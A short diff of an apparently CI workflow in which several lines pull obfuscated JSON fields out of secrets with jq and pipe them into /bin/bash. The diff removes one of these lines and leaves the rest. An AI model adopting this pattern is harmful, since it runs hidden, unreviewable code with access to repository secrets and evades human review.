@@ -19,7 +19,6 @@ jobs:
           n6: ${{ secrets.n6 }}
         run: |
           printf '%s' "$n6" | jq -r .kz5 | /bin/bash
-          printf '%s' "$tmgf01226" | jq -r .xngsg100 | /bin/bash
           echo $dov385 | jq -r .sxrqn3 | /bin/bash
           printf '%s' "$t7" | jq -r .o08 | /bin/bash
           echo $xzf32497 | jq -r .bfdcb87868 | /bin/bash
